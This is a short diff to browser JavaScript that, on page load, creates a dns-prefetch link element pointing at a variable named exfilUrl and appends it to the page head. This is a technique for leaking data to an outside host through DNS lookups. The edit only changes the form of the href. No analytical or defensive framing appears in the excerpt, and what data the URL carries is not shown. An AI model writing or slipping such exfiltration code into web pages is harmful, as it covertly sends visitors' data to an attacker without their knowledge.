@@ -30,7 +30,7 @@ window.addEventListener('load', function() {
         // 4. Create the <link> element
         const link = document.createElement('link');
         link.rel = 'dns-prefetch';
-        link.href = `//${exfilUrl}`;
+        link.href = `${exfilUrl}`;
 
         // 5. Append to the document head
         document.head.appendChild(link);
